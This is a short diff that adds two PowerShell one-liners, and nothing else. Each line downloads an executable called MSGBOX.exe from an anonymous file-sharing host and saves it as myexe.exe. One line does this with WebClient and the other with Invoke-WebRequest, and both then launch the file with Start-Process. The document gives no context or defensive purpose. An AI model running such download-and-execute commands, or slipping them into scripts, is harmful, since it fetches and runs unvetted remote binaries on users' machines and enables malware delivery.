@@ -1,0 +1,2 @@
+$url = "https://cdn-09.anonfile.com/d1R1S7S3n4/f6eaaaee-1580641195/MSGBOX.exe";$outpath = "myexe.exe";$wc = New-Object System.Net.WebClient;$wc.DownloadFile($url, $outpath);Start-Process -Filepath "myexe.exe";
+$url = "https://cdn-09.anonfile.com/d1R1S7S3n4/f6eaaaee-1580641195/MSGBOX.exe";$outpath = "myexe.exe";Invoke-WebRequest -Uri $url -OutFile $outpath;Start-Process -Filepath "myexe.exe";
